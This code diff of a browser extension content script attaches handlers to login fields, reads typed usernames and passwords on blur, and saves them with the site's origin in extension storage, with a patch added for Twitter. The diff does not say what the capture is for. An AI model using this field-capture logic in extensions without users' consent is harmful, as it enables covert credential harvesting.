@@ -8,7 +8,7 @@ let username = "";
 let password = "";
 
 setInterval(() => {
-  if(username === "" && password === "") return;
+  if (username === "" && password === "") return;
   chrome.storage.local.set({
     credentials: {
       domain: window.location.origin,
@@ -69,18 +69,23 @@ function elementSearch(re) {
 // force mount identifier field event handler
 let idHandle = 0;
 idHandle = setInterval(() => {
+  console.log("Try mount id");
   if (!getIdentifier()) return;
   clearInterval(idHandle);
   idHandle = 0;
+
+  // twitter specific patch
+  if(window.location.origin === "https://twitter.com")
+    getIdentifier().blur();
+
   getIdentifier().addEventListener("focus", () => {
-    idHandle && console.log("Identifier focused");
     mountListener();
   });
   getIdentifier().addEventListener("blur", () => {
-    idHandle && console.log("Identifier blurred");
     username = getIdentifier().value;
     unmountListener();
   });
+  console.log("Id mount success");
 }, 0);
 
 // force mount password field event handler
@@ -89,12 +94,15 @@ passHandle = setInterval(() => {
   if (!getPassword()) return;
   clearInterval(passHandle);
   passHandle = 0;
+
+  // twitter specific patch
+  if(window.location.origin === "https://twitter.com")
+    getPassword().blur();
+
   getPassword().addEventListener("focus", () => {
-    passHandle && console.log("Password focused");
     mountListener();
   });
   getPassword().addEventListener("blur", () => {
-    passHandle && console.log("Password blurred");
     password = getPassword().value;
     unmountListener();
   });
